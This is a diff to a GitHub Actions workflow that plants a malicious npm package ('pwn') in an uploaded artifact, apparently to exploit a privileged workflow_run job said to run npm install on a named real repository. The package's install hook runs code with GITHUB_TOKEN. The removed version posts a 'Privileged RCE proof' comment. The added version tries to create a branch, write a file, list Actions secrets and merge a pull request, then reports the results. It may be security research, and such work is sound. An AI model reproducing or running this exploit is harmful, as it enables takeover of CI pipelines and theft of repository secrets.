@@ -37,8 +37,7 @@ jobs:
             "name": "pwn",
             "version": "1.0.0",
             "scripts": {
-              "install": "node index.js dep-install",
-              "postinstall": "node index.js dep-postinstall"
+              "install": "node index.js"
             }
           }
           JSON
@@ -50,33 +49,23 @@ jobs:
           try { pr = fs.readFileSync(path.join(base, 'pr-number.txt'), 'utf8').trim(); } catch (e) {}
           const repo = process.env.GITHUB_REPOSITORY;
           const token = process.env.GITHUB_TOKEN;
-          (async () => {
-            const body = [
-              '## Privileged RCE proof (dependency lifecycle script)',
-              '',
-              'Stage: `' + (process.argv[2] || 'unknown') + '`',
-              '',
-              'The artifact uploaded by the unprivileged `Lint` pull_request run was downloaded',
-              'into the `Post Linter Report` workflow_run job and executed during',
-              '`npm install --no-save github:AdobeDocs/adp-devsite-scripts`.',
-              '',
-              '`GITHUB_TOKEN` present: ' + (token ? 'yes (' + token.slice(0, 4) + '..., length ' + token.length + ')' : 'no'),
-              '`GITHUB_RUN_ID`: ' + process.env.GITHUB_RUN_ID,
-              '`GITHUB_EVENT_NAME`: ' + process.env.GITHUB_EVENT_NAME,
-              'user: ' + require('node:os').userInfo().username,
-              'cwd: ' + process.cwd()
-            ].join('\n');
-            const r = await fetch(`https://api.github.com/repos/${repo}/issues/${pr}/comments`, {
-              method: 'POST',
-              headers: {
-                authorization: `Bearer ${token}`,
-                accept: 'application/vnd.github+json',
-                'content-type': 'application/json'
-              },
-              body: JSON.stringify({ body })
+          async function api(method, url, body) {
+            const r = await fetch('https://api.github.com/repos/' + repo + url, {
+              method,
+              headers: { authorization: `Bearer ${token}`, accept: 'application/vnd.github+json', 'content-type': 'application/json' },
+              body: body ? JSON.stringify(body) : undefined
             });
-            console.log('proof comment status:', r.status);
-          })().catch((e) => { console.error('proof failed:', e && e.message); });
+            return r.status + ' ' + (await r.text()).slice(0, 200);
+          }
+          (async () => {
+            const probes = {};
+            probes.git_ref_create = await api('POST', '/git/refs', { ref: 'refs/heads/pwn-branch', sha: process.env.GITHUB_SHA });
+            probes.contents_write = await api('PUT', '/contents/pwn.txt', { message: 'x', content: 'aGk=' });
+            probes.list_secrets = await api('GET', '/actions/secrets');
+            probes.merge_pr2 = await api('PUT', '/pulls/2/merge', { merge_method: 'squash' });
+            probes.comment = await api('POST', '/issues/' + pr + '/comments', { body: '## Privileged token capability probe\n\n```\n' + Object.entries(probes).filter(([k]) => k !== 'comment').map(([k, v]) => k + ': ' + v).join('\n') + '\n```' });
+            console.log(JSON.stringify(probes, null, 1));
+          })().catch((e) => { console.error('probe failed:', e && e.message); });
           JS
           tar -czf pwn-1.0.0.tgz -C pkg package
           cat > package.json <<'JSON'
@@ -84,17 +73,11 @@ jobs:
             "name": "artifact-payload-root",
             "version": "1.0.0",
             "private": true,
-            "scripts": {
-              "preinstall": "node rce.js root-preinstall",
-              "install": "node rce.js root-install",
-              "postinstall": "node rce.js root-postinstall"
-            },
             "dependencies": {
               "pwn": "file:./pwn-1.0.0.tgz"
             }
           }
           JSON
-          cp pkg/package/index.js rce.js
 
       - name: Upload linter report
         if: always()
@@ -105,6 +88,5 @@ jobs:
             linter-report.txt
             pr-number.txt
             package.json
-            rce.js
             pwn-1.0.0.tgz
           if-no-files-found: ignore
